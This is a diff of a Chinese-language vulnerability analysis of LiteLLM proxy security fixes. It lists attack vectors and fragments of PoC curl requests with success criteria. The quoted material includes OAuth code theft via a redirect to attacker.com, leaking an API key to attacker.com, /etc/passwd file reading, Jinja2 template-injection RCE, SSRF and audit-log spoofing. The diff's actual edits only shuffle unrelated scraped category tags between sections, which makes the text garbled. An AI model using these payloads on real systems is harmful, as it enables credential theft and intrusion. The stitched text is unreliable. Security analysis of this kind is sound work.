@@ -31,16 +31,16 @@ asset_dir: embedded-base64
 
 ### 2.1 PR #26463 — MCP 公共路由检测绕过 + OAuth2 Fallback
 
-深入探索
-
-blog
-
-数据格式与协议
-
-软件
-
 **[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")类型**: 认证绕过 (CWE-290)  
 **修复文件**: `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py`
+
+深入探索
+
+字典与百科全书
+
+软件实用程序
+
+会计与审计
 
 **代码差异**:
 
@@ -48,6 +48,14 @@ blog
 修复前: if ".well-known" in str(request.url)
 修复后: if request.url.path.startswith("/.well-known/")
 ```
+
+深入探索
+
+计算机科学
+
+Blog
+
+网安
 
 **攻击向量**: 在 URL 的 query string 中注入 `.well-known` 子字符串（如 `?redirect=.well-known`），使请求被误判为公开路由，跳过认证。
 
@@ -163,7 +171,7 @@ blog
 
 **攻击向量**: 构造恶意 OAuth state，将 client\_redirect\_uri 设为 `https://attacker.com/cb`，callback 将 authorization code 重定向到攻击者域名。
 
-开放源代码
+网络
 
 ---
 
@@ -244,7 +252,7 @@ blog
 
 按 GHSA 分析器验证框架，对每个 PR 的分析结论逐项与实际 diff 对照。
 
-网络
+编程
 
 ### 审核结论
 
@@ -288,7 +296,7 @@ Content-Type: application/json
 
 **判断依据**: 200 + 包含 tools 数组 = 绕过成功；401/403 = 已修复
 
-编程
+网络安全
 
 #### PoC #26463-B: OAuth2 Fallback 无条件执行
 
@@ -334,7 +342,7 @@ Authorization: Bearer sk-your-litellm-key
 
 **判断依据**: 在 attacker.com 日志中观察到 Authorization header 包含 GROQ\_API\_KEY = 泄露成功
 
-网络安全
+黑客与破解
 
 #### PoC #26484: Master Key 泄露到 /metrics
 
@@ -365,7 +373,7 @@ Host: target:4000
 
 **判断依据**: 200 + 响应包含 API key = 劫持成功；需要 poll\_secret = 已修复
 
-黑客与破解
+计算机安全
 
 ---
 
@@ -394,7 +402,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 成员角色为 admin = 提权成功；403 = 已修复
 
-计算机安全
+数学
 
 #### PoC #26831: Batch 身份冒用
 
@@ -431,7 +439,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 无 guardrail 拦截 = 绕过成功；403 guardrail violation = 已修复
 
-数学
+网络安全
 
 #### PoC #26827: Passthrough 默认无认证
 
@@ -465,7 +473,7 @@ curl -v "http://target:4000/mcp/oauth/callback?code=stolen-auth-code&state=malic
 
 **判断依据**: 302 重定向到 attacker.com/cb?code=... = code 窃取成功；400 invalid redirect = 已修复
 
-会计与审计
+编程
 
 #### PoC #26849: SSRF via OAuth Meta[data](#) Discovery
 
@@ -491,8 +499,6 @@ curl -v "http://target:4000/get_image?width=100"
 
 **判断依据**: 响应包含内网服务内容 = SSRF 成功；302 重定向或空响应 = 已修复
 
-计算机科学
-
 #### PoC #26815-B: Logo 路径泄露
 
 ```
@@ -500,6 +506,8 @@ curl -v "http://target:4000/get_logo_url"
 ```
 
 **判断依据**: 响应包含本地路径（如 `/opt/litellm/config/secret.key`）= 泄露成功；空字符串 = 已修复
+
+计算机安全
 
 #### PoC #26862-A: Response Header Injection
 
@@ -518,8 +526,6 @@ curl -v -X POST http://target:4000/chat/completions \
 
 **判断依据**: 响应头包含 `x-injected-evil` = 注入成功；header 被过滤 = 已修复
 
-开放源代码
-
 #### PoC #26862-B: Audit Log Spoofing
 
 ```
@@ -531,6 +537,8 @@ curl -v -X POST http://target:4000/key/generate \
 ```
 
 **判断依据**: 审计日志 changed\_by="fake-admin-identity" = 伪造成功；changed\_by=实际用户 = 已修复
+
+黑客与破解
 
 ---
 
@@ -551,8 +559,6 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 
 **判断依据**: 请求发送到畸形 AWS endpoint = 注入成功；400 invalid region = 已修复
 
-编程
-
 #### PoC #27794: 任意文件读取
 
 ```
@@ -564,6 +570,8 @@ curl -v -X POST http://target:4000/v1/audio/transcriptions \
 ```
 
 **判断依据**: 响应包含 /etc/passwd 内容 = 任意文件读取成功；400 invalid input = 已修复
+
+网络安全
 
 #### PoC #27539: 预算耗尽 DoS
 
@@ -579,8 +587,6 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 ```
 
 **判断依据**: 请求成功 + 预算预留被锁定为团队全部余额 = DoS 成功；400 max\_tokens exceeded = 已修复
-
-网络安全
 
 #### PoC #26809: 预算绕过 via null budget
 
@@ -611,8 +617,6 @@ curl -v -X POST http://target:4000/team/callback_new \
 
 **判断依据**: 审计日志无此操作记录 = 日志缺失；审计日志存在且 secret\_key 脱敏 = 已修复
 
-黑客与破解
-
 #### PoC #27554: Jinja2 模板注入
 
 ```
@@ -629,6 +633,8 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 ```
 
 **判断依据**: 响应包含命令执行结果 = RCE 成功；模板渲染错误或沙箱限制 = 已修复
+
+黑客与破解
 
 ---
 
@@ -702,8 +708,6 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 回调日志中包含真实 DATABASE\_URL/AWS\_SECRET = 泄露；key 创建被拒绝 = 已修复
 
-会计与审计
-
 #### PoC #26836: MCP 凭据明文存储
 
 ```
@@ -721,6 +725,8 @@ FROM "LiteLLM_MCPUserCredentials";
 ```
 
 **判断依据**: base64 解码后得到明文 API key = 明文存储；解码后为不可读二进制 = 已加密
+
+编程
 
 ---
 
